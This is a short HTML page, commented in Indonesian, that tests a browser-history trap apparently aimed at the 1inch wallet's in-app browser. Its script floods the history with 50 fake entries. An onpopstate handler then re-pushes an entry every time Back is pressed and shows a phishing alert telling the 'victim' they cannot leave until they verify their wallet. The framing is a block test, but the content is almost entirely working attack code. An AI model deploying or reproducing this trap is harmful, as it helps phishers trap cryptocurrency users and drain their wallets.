<!DOCTYPE html>
<html>
<body>
<h3>History Trap Test</h3>
<p>Setelah klik tombol, coba pencet Back di 1inch. Apakah bisa balik atau ke-lock?</p>
<button onclick="jebak()">1. Tanem 50 History Palsu</button><br><br>
<button onclick="jebak2()">2. Tanem Trap + onpopstate</button>
<pre id="o">Klik tombol 1 dulu...</pre>
<script>
function jebak(){
  let out = document.getElementById('o');
  out.innerText = "Nanem 50 history...\n";
  for(let i=0; i<50; i++){
    history.pushState({trap:i}, "", "/trap"+i);
  }
  out.innerText += "Selesai. history.length sekarang: " + history.length + "\n";
  out.innerText += "Sekarang coba pencet BACK di 1inch (tombol < di bawah).\n";
  out.innerText += "Kalo lu harus pencet Back 50x baru bisa keluar = KENA TRAP\n";
  out.innerText += "Kalo lu cuma pencet Back 1x langsung balik ke 1inch = AMAN, 1inch nge-block spam pushState";
}
function jebak2(){
  let out = document.getElementById('o');
  out.innerText = "Nanem Trap + onpopstate...\n";
  history.pushState({trap:'lock'}, "", "/locked");
  window.onpopstate = function(e){
    // Ini yang nge-lock: setiap kali korban pencet Back, kita tanem lagi history baru
    history.pushState({trap:'lock2'}, "", "/locked-again");
    document.getElementById('o').innerText = "Back ke-block! Lu masih di halaman phishing. Coba pencet Back lagi...\nKalo ini terus keulang, berarti KENA HISTORY TRAP";
    alert("Kamu tidak bisa keluar! Verifikasi wallet dulu!");
  };
  out.innerText += "Trap dipasang. Coba pencet Back sekarang.\nKalo muncul alert + gak bisa keluar = KENA";
}
</script>
</body>
</html>
